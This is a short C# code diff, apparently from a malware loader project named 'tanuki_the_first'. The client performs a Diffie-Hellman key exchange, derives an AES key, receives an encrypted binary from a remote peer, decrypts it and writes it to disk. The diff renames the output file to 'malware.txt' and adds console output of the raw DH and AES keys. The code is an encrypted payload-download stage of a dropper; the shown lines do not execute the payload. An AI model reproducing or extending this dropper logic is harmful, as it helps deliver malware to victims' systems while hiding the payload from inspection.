@@ -66,16 +66,19 @@ namespace tanuki_the_first
 
                 comm.SendMessage(parameters_bytes);
 
-                Console.WriteLine("Key: " + this.dh_key);
+                Console.WriteLine("DH Key int: " + dh_key.ToString());
+                Console.WriteLine("DH Key hex: " + dh_key.ToString("X"));
 
-                aes_key = new BigInteger(Cryptography.ComputeAESKey(dh_key.ToByteArray()));
-                Console.WriteLine("AES Key: " + ByteArrayToString(this.aes_key.ToByteArray()));
+                aes_key = new BigInteger(Cryptography.ComputeAESKey(dh_key.ToString("X")));
+                
+                Console.WriteLine("AES Key hex: " + ByteArrayToString(this.aes_key.ToByteArray()));
 
                 byte[] binary_data;
-                (binary_data, bytesRead) = comm.RecvMessage(1024);
+                //(binary_data, bytesRead) = comm.RecvBinary(58_901_174);
+                (binary_data, bytesRead) = comm.RecvBinary(4096);
                 binary_data = Cryptography.AESDecrypt(binary_data, aes_key.ToByteArray());
 
-                using (FileStream file = new FileStream("binary_file.txt", FileMode.Create, FileAccess.Write))
+                using (FileStream file = new FileStream("malware.txt", FileMode.Create, FileAccess.Write))
                 {
                     file.Write(binary_data, 0, bytesRead);
                 }
